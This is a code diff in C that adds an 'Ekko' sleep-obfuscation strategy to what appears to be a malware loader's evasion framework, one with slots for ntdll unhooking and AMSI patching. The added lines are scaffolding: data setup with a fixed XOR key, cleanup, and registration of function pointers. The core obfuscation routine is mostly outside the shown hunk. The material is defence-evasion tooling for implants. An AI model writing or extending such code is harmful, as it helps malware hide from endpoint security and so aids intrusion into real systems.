@@ -101,4 +101,73 @@ BOOL Ekko_ObfuscateSleep(PRTLDR_CTX ctx, DWORD dwMilliseconds) {
     }
     
     return TRUE;
+}
+
+// Ekko strategy private data
+typedef struct _EKKO_DATA {
+    BYTE bXorKey;
+    PVOID pCodeBase;
+    SIZE_T uCodeSize;
+} EKKO_DATA, *PEKKO_DATA;
+
+// Ekko strategy initialization
+static BOOL Ekko_Initialize(PRTLDR_CTX ctx) {
+    PEKKO_DATA ekko_data = NULL;
+    
+    if (!ctx) {
+        return FALSE;
+    }
+    
+    // Allocate strategy data
+    ekko_data = (PEKKO_DATA)ctx->mem_alloc(sizeof(EKKO_DATA));
+    if (!ekko_data) {
+        return FALSE;
+    }
+    
+    // Initialize Ekko data
+    ekko_data->bXorKey = 0x42; // Simple XOR key
+    ekko_data->pCodeBase = (PVOID)0x140000000; // Will be updated with real base
+    ekko_data->uCodeSize = 0x1000; // Will be updated with real size
+    
+    // Store in context
+    ctx->strategy_data = ekko_data;
+    
+    return TRUE;
+}
+
+// Ekko strategy cleanup
+static BOOL Ekko_Cleanup(PRTLDR_CTX ctx) {
+    if (!ctx) {
+        return FALSE;
+    }
+    
+    if (ctx->strategy_data && ctx->mem_free) {
+        ctx->mem_free(ctx->strategy_data);
+        ctx->strategy_data = NULL;
+    }
+    
+    return TRUE;
+}
+
+// Ekko strategy loader
+BOOL Strategy_LoadEkko(PEVASION_STRATEGY pStrategy) {
+    if (!pStrategy) {
+        return FALSE;
+    }
+    
+    // Set strategy metadata
+    pStrategy->szStrategyName = "Ekko";
+    pStrategy->dwVersion = 1;
+    pStrategy->type = STRATEGY_EKKO;
+    
+    // Set function pointers
+    pStrategy->pfnInitialize = Ekko_Initialize;
+    pStrategy->pfnObfuscateSleep = Ekko_ObfuscateSleep;
+    pStrategy->pfnCleanup = Ekko_Cleanup;
+    
+    // Ekko doesn't implement unhooking or AMSI patching
+    pStrategy->pfnUnhookNtdll = NULL;
+    pStrategy->pfnPatchAMSI = NULL;
+    
+    return TRUE;
 } 
